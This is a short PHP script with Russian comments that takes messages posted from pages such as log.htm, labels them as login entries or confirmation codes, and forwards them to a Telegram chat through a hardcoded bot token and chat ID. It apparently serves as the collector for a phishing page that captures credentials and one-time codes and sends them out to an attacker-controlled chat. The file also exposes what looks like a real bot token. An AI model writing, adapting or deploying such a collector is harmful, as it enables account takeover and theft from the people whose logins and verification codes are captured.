<?php
// 🔐 Настройки
$botToken = '8291314590:AAFqutDCkSmsWlIf7jLr1XPy6RsLfuAiMCY'; // ← ВСТАВЬ свой токен
$chatId   = '-1003047513638';    // ← ВСТАВЬ свой chat_id

// 📥 Получаем данные
$data = json_decode(file_get_contents('php://input'), true);
$message = $data['message'] ?? '';
$source  = $data['source'] ?? '';

// 🌍 Определяем домен
$host = $_SERVER['HTTP_HOST'];
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$allowedPages = [
    "https://$host/index.html",
    "https://$host/log.htm",
    "https://$host/"
];

// 🔐 Проверка источника
$allowed = false;
foreach ($allowedPages as $origin) {
    if (stripos($referer, $origin) === 0) {
        $allowed = true;
        break;
    }
}

if (!$allowed) {
    http_response_code(403);
    exit('Запрещённый источник запроса');
}

// ✏️ Добавляем метку
$label = match ($source) {
    'login' => '🟦 Вход:',
    'code'  => '🟨 Подтверждение:',
    default => '📨 Неопределённый источник:'
};

$finalMessage = "$label\n$message";

// 📤 Отправка в Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$payload = [
    'chat_id' => $chatId,
    'text'    => $finalMessage
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-type: application/json\r\n",
        'content' => json_encode($payload)
    ]
];

$context = stream_context_create($options);
file_get_contents($url, false, $context);

// ✅ Ответ
echo json_encode(['status' => 'ok']);
?>
